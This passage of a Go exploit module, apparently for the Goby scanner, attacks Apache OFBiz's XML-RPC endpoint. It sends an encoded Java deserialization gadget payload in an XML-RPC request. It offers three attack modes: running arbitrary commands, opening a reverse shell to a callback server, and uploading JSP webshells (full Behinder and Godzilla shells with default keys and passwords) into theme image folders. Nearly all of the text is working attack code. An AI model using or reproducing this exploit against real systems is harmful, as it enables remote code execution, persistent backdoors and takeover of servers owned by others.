UUFFS0VvcFZnRUFDV1Y0YVhSV1lXeDFaUUVBQ21kbGRFMWxjM05oWjJVQkFBaHBiblJXWVd4MVpRQWhBSXdBSGdBQkFBOEFBZ0FDQUkwQWpnQUFBQUlBandDUUFBQUFDUUFCQUpFQWtnQUNBSk1BQUFPMkFBWUFFd0FBQW80cXR3QUJ1QUFDdGdBRFRDdTJBQVFTQmJZQUJrMHNCTFlBQnl3cnRnQUl3QUFKd0FBSlRpMDZCQmtFdmpZRkF6WUdGUVlWQmFJQ1dCa0VGUVl5T2djWkI4Y0FCcWNDUXhrSHRnQUtPZ2daQ0JJTHRnQU1tZ0FOR1FnU0RiWUFESm9BQnFjQ0pSa0h0Z0FFRWc2MkFBWk5MQVMyQUFjc0dRZTJBQWc2Q1JrSndRQVBtZ0FHcHdJQ0dRbTJBQVFTRUxZQUJrMHNCTFlBQnl3WkNiWUFDRG9KR1FtMkFBUVNFYllBQmsybkFCWTZDaGtKdGdBRXRnQVR0Z0FURWhHMkFBWk5MQVMyQUFjc0dRbTJBQWc2Q1JrSnRnQUV0Z0FURWhTMkFBWk5wd0FRT2dvWkNiWUFCQklVdGdBR1RTd0V0Z0FITEJrSnRnQUlPZ2taQ2JZQUJCSVZ0Z0FHVFN3RXRnQUhMQmtKdGdBSXdBQVd3QUFXT2dvWkNya0FGd0VBT2dzWkM3a0FHQUVBbVFGYkdRdTVBQmtCQURvTUdReTJBQVFTR3JZQUJrMHNCTFlBQnl3WkRMWUFDRG9OR1EyMkFBUVNHd085QUJ5MkFCMFpEUU85QUI2MkFCODZEaGtOdGdBRUVpQUV2UUFjV1FNU0lWTzJBQjBaRFFTOUFCNVpBeElpVTdZQUg4QUFJVG9QR1EvSEFBYW4vNUVxR1ErMkFDTzJBQ1E2RUJrT3RnQUVFaVVFdlFBY1dRT3lBQ1pUdGdBZEdRNEV2UUFlV1FNUkFNaTRBQ2RUdGdBZlZ5b1NLTFlBS1RvUkdSRzJBQ282Q1JrUkVpc0d2UUFjV1FNU0xGTlpCTElBSmxOWkJiSUFKbE8yQUMwWkNRYTlBQjVaQXhrUVUxa0VBN2dBSjFOWkJSa1F2cmdBSjFPMkFCOVhHUTYyQUFRU0xnUzlBQnhaQXhrUlU3WUFIUmtPQkwwQUhsa0RHUWxUdGdBZlY2Y0FUem9SS2hJd3RnQXBPaElaRWhJeEJMMEFIRmtERWl4VHRnQXRHUklFdlFBZVdRTVpFRk8yQUI4NkNSa090Z0FFRWk0RXZRQWNXUU1aRWxPMkFCMFpEZ1M5QUI1WkF4a0pVN1lBSDFlbkFBNm5BQVU2Q0lRR0FhZjlwN0VBQndDZ0FLc0FyZ0FTQU00QTNBRGZBQklCeEFJd0FqTUFMd0EvQUVRQ2hRQXZBRWNBWWdLRkFDOEFaUUNGQW9VQUx3Q0lBbjhDaFFBdkFBRUFsQUFBQU40QU53QUFBQlVBQkFBV0FBc0FGd0FWQUJnQUdnQVpBQ1lBR3dBL0FCMEFSd0FlQUU0QUh3QmxBQ0FBY0FBaEFIVUFJZ0I5QUNNQWlBQWtBSk1BSlFDWUFDWUFvQUFvQUtzQUt3Q3VBQ2tBc0FBcUFNRUFMQURHQUMwQXpnQXZBTndBTWdEZkFEQUE0UUF4QU93QU13RHhBRFFBK1FBMUFRUUFOZ0VKQURjQkZ3QTRBVE1BT1FFK0FEb0JRd0E3QVVzQVBBRmtBRDBCaWdBK0FZOEFQd0dTQUVFQm5RQkNBY1FBUkFITUFFVUIwd0JHQWc0QVJ3SXdBRXdDTXdCSUFqVUFTUUk5QUVvQ1hRQkxBbjhBVFFLQ0FGRUNoUUJQQW9jQUd3S05BRk1BbFFBQUFBUUFBUUF2QUFFQWxnQ1hBQU1Ba3dBQUFEa0FBZ0FEQUFBQUVTdTRBREt3VGJnQUFyWUFOQ3UyQURXd0FBRUFBQUFFQUFVQU13QUJBSlFBQUFBT0FBTUFBQUJkQUFVQVhnQUdBRjhBbFFBQUFBUUFBUUF6QUpnQUFBQUNBSmtBQVFDYUFKc0FBUUNUQUFBQS93QUVBQVFBQUFDYks4WUFEQkkySzdZQU41a0FCaEk0c0N1MkFEbE1LeEk2dGdBN21RQTdLaXUzQUR3U1BiWUFQazBzdmdXZkFBWVNQN0FxTEFNeXRRQkFLaXdFTXJnQVFiZ0FKN1VBUXJzQVExa3F0d0JFVGkyMkFFVVNSckFyRWtlMkFEdVpBQ0lxSzdjQVBCSTl0Z0ErVFN5K0JaOEFCaEpJc0Nvc0F6SXNCREsyQUVtd0t4Skt0Z0E3bVFBTktpb3J0d0E4dGdCTHNDb3FLN2NBUExZQVM3QUFBQUFCQUpRQUFBQlNBQlFBQUFCcEFBMEFhZ0FRQUd3QUZRQnRBQjRBYndBcEFIQUFMd0J4QURJQWN3QTVBSFFBUmdCMUFFOEFkZ0JUQUhjQVZnQjRBRjhBZVFCcUFIb0FjQUI3QUhNQWZRQitBSDRBaHdCL0FKRUFnUUFCQUp3QW5RQUJBSk1BQUFCMkFBTUFCUUFBQURhN0FFeFpLN2NBVFU2N0FFNVpMYmNBVHpvRUdRUXN1QUJRdGdCUkdRUzJBRklaQkxZQVU2Y0FDem9FR1FTMkFGU3dMYllBVmJBQUFRQUpBQ1lBS1FBdkFBRUFsQUFBQUNZQUNRQUFBSXdBQ1FDT0FCTUFqd0FjQUpBQUlRQ1JBQ1lBbEFBcEFKSUFLd0NUQURFQWxRQUNBSjRBbXdBQkFKTUFBQUF2QUFNQUFnQUFBQmNyRWpvU05yWUFWaEpLRWphMkFGWVNSeEkydGdCV3NBQUFBQUVBbEFBQUFBWUFBUUFBQUo0QUFRQ2ZBSnNBQVFDVEFBQUJ4d0FFQUFrQUFBRW5FbGU0QUZpMkFGbE5LN1lBT1V3QlRpd1NXcllBREprQVFDc1NXN1lBREprQUlDc1NYTFlBREpvQUY3c0FYVm0zQUY0cnRnQmZFbUMyQUYrMkFHRk1CcjBBSVZrREVpSlRXUVFTWWxOWkJTdFRPZ1NuQUQwckVsdTJBQXlaQUNBckVseTJBQXlhQUJlN0FGMVp0d0JlSzdZQVh4Smp0Z0JmdGdCaFRBYTlBQ0ZaQXhKa1Uxa0VFbVZUV1FVclV6b0V1QUJtR1FTMkFHZE91d0JvV1MyMkFHbTNBR29TYTdZQWJEb0ZHUVcyQUcyWkFBc1pCYllBYnFjQUJSSTJPZ2E3QUdoWkxiWUFiN2NBYWhKcnRnQnNPZ1c3QUYxWnR3QmVHUWEyQUY4WkJiWUFiWmtBQ3hrRnRnQnVwd0FGRWphMkFGKzJBR0U2QmhrR09nY3R4Z0FITGJZQWNCa0hzRG9GR1FXMkFGUTZCaTNHQUFjdHRnQndHUWF3T2dndHhnQUhMYllBY0JrSXZ3QUVBSkFBK3dFR0FDOEFrQUQ3QVJvQUFBRUdBUThCR2dBQUFSb0JIQUVhQUFBQUFRQ1VBQUFBYmdBYkFBQUFwd0FKQUtnQURnQ3BBQkFBcXdBWkFLd0FLd0N0QUQ4QXJ3QldBTEVBYUFDeUFId0F0QUNRQUxjQW1RQzRBS3NBdVFDL0FMb0EwUUM3QVBjQXZBRDdBTUFBL3dEQkFRTUF2QUVHQUwwQkNBQytBUThBd0FFVEFNRUJGd0MrQVJvQXdBRWdBTUVCSkFEREFBRUFvQUNoQUFFQWt3QUFBVmtBQkFBTUFBQUF5UkpYdUFCWXRnQlpFbHEyQUF5YUFBa1NjVTZuQUFZU2NrNjRBR1l0dGdCek9nUzdBSFJaS3h5M0FIVTZCUmtFdGdCcE9nWVpCTFlBYnpvSEdRVzJBSFk2Q0JrRXRnQjNPZ2taQmJZQWVEb0tHUVcyQUhtYUFHQVpCcllBZXA0QUVCa0tHUWEyQUh1MkFIeW4vKzRaQjdZQWVwNEFFQmtLR1FlMkFIdTJBSHluLys0WkNMWUFlcDRBRUJrSkdRaTJBSHUyQUh5bi8rNFpDcllBZlJrSnRnQjlGQUIrdUFDQUdRUzJBSUZYcHdBSU9ndW4vNTRaQkxZQWNCa0Z0Z0NDcHdBSlRpMjJBSU5Yc1FBQ0FLY0FyUUN3QUM4QUFBQy9BTUlBTHdBQkFKUUFBQUJ1QUJzQUFBRFBBQkFBMEFBV0FOSUFHUURVQUNJQTFRQXRBTllBUWdEWEFGQUEyQUJZQU5rQVlBRGFBRzBBM0FCMUFOMEFnZ0RmQUlvQTRBQ1hBT0lBbkFEakFLRUE1QUNuQU9ZQXJRRG5BTEFBNkFDeUFPa0F0UURyQUxvQTdBQy9BTzhBd2dEdEFNTUE3Z0RJQVBBQUFRQ2lBSklBQVFDVEFBQUFMQUFEQUFFQUFBQVFLaXEwQUVBcXRBQkN0Z0NFdGdDRnNRQUFBQUVBbEFBQUFBb0FBZ0FBQVBRQUR3RDFBQWtBb3dDa0FBRUFrd0FBQVJ3QUJnQUVBQUFBckFGTUVvYTRBREpOTEJLSEJMMEFIRmtERWlGVHRnQWRMTFlBS2dTOUFCNVpBeXBUdGdBZndBQXN3QUFzVEtjQUJFMHJ4d0JERW9pNEFESVNpUU85QUJ5MkFCMEJBNzBBSHJZQUgwMHN0Z0FFRW9vRXZRQWNXUU1TSVZPMkFCMHNCTDBBSGxrREtsTzJBQi9BQUN6QUFDeE1wd0FFVFN2SEFEUVNpN2dBTWswc0Vvb0V2UUFjV1FNU0lWTzJBQjFPTFN5MkFDb0V2UUFlV1FNcVU3WUFIOEFBTE1BQUxFeW5BQVJOSzdBQUF3QUNBQzBBTUFBdkFEVUFjUUIwQUM4QWVRQ21BS2tBTHdBQkFKUUFBQUJHQUJFQUFBRDlBQUlBL3dBSUFRQUFMUUVEQURBQkFRQXhBUVFBTlFFR0FFd0JCd0J4QVFvQWRBRUlBSFVCREFCNUFRNEFmd0VQQUk4QkVBQ21BUk1BcVFFUkFLb0JGUUFCQUtVQUFBQUNBS1k9IjtjbHo9ZGVmaW5lQ2xhc3MoYmFzZTY0RGVjb2RlVG9CeXRlKGNvZGUpKSxjbHoubmV3SW5zdGFuY2UoKTsHACoMACsALAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAA15c29zZXJpYWwvVFQxAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAD2dldEVuZ2luZUJ5TmFtZQEALyhMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L3NjcmlwdC9TY3JpcHRFbmdpbmU7AQAZamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZQEABGV2YWwBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwAhAAsADAAAAAEAAAANAA4AAAAEAAEADwAQAAIAEQAAACEAAQADAAAABSq2AAGxAAAAAQASAAAACgACAAAAFQAEABYAEwAAAAQAAQAUAAEADwAVAAIAEQAAACEAAQAEAAAABSq2AAGxAAAAAQASAAAACgACAAAAGQAEABoAEwAAAAQAAQAUAAEAFgAXAAEAEQAAADIAAgABAAAADiq3AAIqA7UAAyq2AAGxAAAAAQASAAAAEgAEAAAAHQAEABEACQAeAA0AHwABABgAFwABABEAAABaAAIAAgAAACYqtAADmQAEsSoEtQADuwAEWbcABRIGtgAHEgi5AAkCAFenAARMsQABAA0AIQAkAAoAAQASAAAAGgAGAAAAIgAHACMACAAlAA0AJwAhACgAJQApAAEAGQAAAAIAGnB0ABJIZWxsb1RlbXBsYXRlc0ltcGxwdwEAeHEAfgANeA==</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>`
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	uploadFlag91rqTc := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		savePath := map[string]string{
			`/themes/tomahawk/webapp/tomahawk/images/` + filename:         `/tomahawk/images/` + filename,
			`/themes/bluelight/webapp/bluelight/images/` + filename:       `/bluelight/images/` + filename,
			`/themes/flatgrey/webapp/flatgrey/images/` + filename:         `/flatgrey/images/` + filename,
			`/themes/rainbowstone/webapp/rainbowstone/images/` + filename: `/rainbowstone/images/` + filename,
			`/themes/multiflex/webapp/multiflex/images/` + filename:       `/multiflex/images/` + filename,
			`/themes/common/webapp/images/` + filename:                    `/images/` + filename,
			`/themes/common-theme/webapp/images/` + filename:              `/images/` + filename,
		}
		paths := []string{`/themes/tomahawk/webapp/tomahawk/images/` + filename, `/themes/bluelight/webapp/bluelight/images/` + filename, `/themes/flatgrey/webapp/flatgrey/images/` + filename, `/themes/rainbowstone/webapp/rainbowstone/images/` + filename, `/themes/multiflex/webapp/multiflex/images/` + filename, `/themes/common/webapp/images/` + filename, `/themes/common-theme/webapp/images/` + filename}

		for _, path := range paths {
			command := `$$$$$.` + path + `:` + base64.StdEncoding.EncodeToString([]byte(content))
			if resp, err := sendPayloadFlag91rqTc(hostInfo, command); resp == nil && err != nil {
				return nil, err
			} else if resp != nil && strings.HasPrefix(resp.RawBody, `java.io.FileNotFoundException: `) {
				continue
			}
			for i := 0; i < 5; i++ {
				checkRequestConfig := httpclient.NewGetRequestConfig(savePath[path])
				checkRequestConfig.VerifyTls = false
				checkRequestConfig.FollowRedirect = false
				if resp, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					return resp, nil
				} else if err != nil {
					return nil, err
				}
				time.Sleep(time.Second * 2)
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, _ := sendPayloadFlag91rqTc(u, "echo "+checkString)
			success := resp != nil && strings.Contains(resp.Utf8Html, checkString)
			if success {
				ss.VulURL = u.FixedHostInfo + `/webtools/control/xmlrpc`
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "cmd" {
				cmd := ss.Params["cmd"].(string)
				if resp, err := sendPayloadFlag91rqTc(expResult.HostInfo, cmd); resp != nil && strings.Contains(resp.RawBody, `<?xml`) {
					expResult.Success = true
					expResult.Output = resp.RawBody[:strings.LastIndex(resp.RawBody, `<?xml`)]
				} else if resp != nil && strings.Contains(strings.ToLower(hex.EncodeToString([]byte(resp.RawBody))), `0a1f8b080000000000000065904d6b02311086ffca90bb1b0b3d`) {
					result, err := hex.DecodeString(strings.ToLower(hex.EncodeToString([]byte(resp.RawBody)))[:strings.Index(strings.ToLower(hex.EncodeToString([]byte(resp.RawBody))), `0a1f8b080000000000000065904d6b02311086ffca90bb1b0b3d`)])
					if err != nil {
						expResult.Output = err.Error()
					} else {
						expResult.Success = true
						expResult.Output = string(result)
					}
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				sendPayloadFlag91rqTc(expResult.HostInfo, cmd)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = ss.Params["content"].(string)
					filename = goutils.B2S(ss.Params["filename"])
				}
				if resp, err := uploadFlag91rqTc(expResult.HostInfo, filename, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
